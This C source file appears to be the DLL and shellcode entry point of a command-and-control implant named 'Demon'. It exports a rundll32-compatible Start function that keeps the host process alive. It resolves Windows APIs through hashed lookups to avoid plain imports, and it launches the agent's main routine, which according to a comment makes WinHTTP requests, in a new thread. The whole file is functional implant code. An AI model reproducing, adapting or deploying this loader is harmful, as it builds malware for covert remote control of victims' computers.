#include <Demon.h>

#include <Common/Defines.h>

#ifndef SHELLCODE
/* Export this for rundll32 or any other program that requires and exported functions...
 * TODO: make this function name optional/changeable in the payload generator.*/
DLLEXPORT VOID Start(  )
{
    /* prevent exiting if started using rundll32 or something */
    PVOID Kernel32  = LdrModulePeb( H_MODULE_KERNEL32 );
    VOID ( WINAPI *DoSleep ) (
        DWORD
    ) = LdrFunctionAddr( Kernel32, H_FUNC_SLEEP );

    // calling sleep lowers the CPU consumed in this loop
    while ( TRUE ) {
        DoSleep( 24 * 60 * 60 * 1000 );
    }
}
#endif

/* this is our entrypoint for the Dll (also for shellcode) */
DLLEXPORT BOOL WINAPI DllMain(
    IN     HINSTANCE hDllBase,
    IN     DWORD     Reason,
    IN OUT LPVOID    Reserved
) {
    PVOID Kernel32 = NULL;

    if ( Reason == DLL_PROCESS_ATTACH )
    {

#if !defined(SHELLCODE) && defined(DEBUG)
        /* if the dll is compiled in debug mode start a console to write our debug prints to */
        AllocConsole();
        freopen( "CONOUT$", "w", stdout );
#endif

#ifdef SHELLCODE
        /* we dont need to make a new thread since we get loaded by our shellcode */
        DemonMain( hDllBase, Reserved );
#else
        /* if we don't compile for the shellcode then start a new thread.
         * why? because if not then we get an ERROR_INVALID_STATE from WinHttpSendRequest
         * because we can't make HTTP requests in DllMain which seems that WinHTTP doesn't like */
        Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 );
        HANDLE ( WINAPI *NewThread ) (
                LPSECURITY_ATTRIBUTES,
                SIZE_T,
                LPTHREAD_START_ROUTINE,
                LPVOID,
                DWORD,
                LPDWORD
        ) = LdrFunctionAddr( Kernel32, H_FUNC_CREATETHREAD ); /* you can load another function here using
                                                                 * LdrModulePeb or LdrModuleLoad then LdrFunctionAddr */

        NewThread( NULL, 0, C_PTR( DemonMain ), hDllBase, 0, NULL );
#endif
        return TRUE;
    }

    return FALSE;
}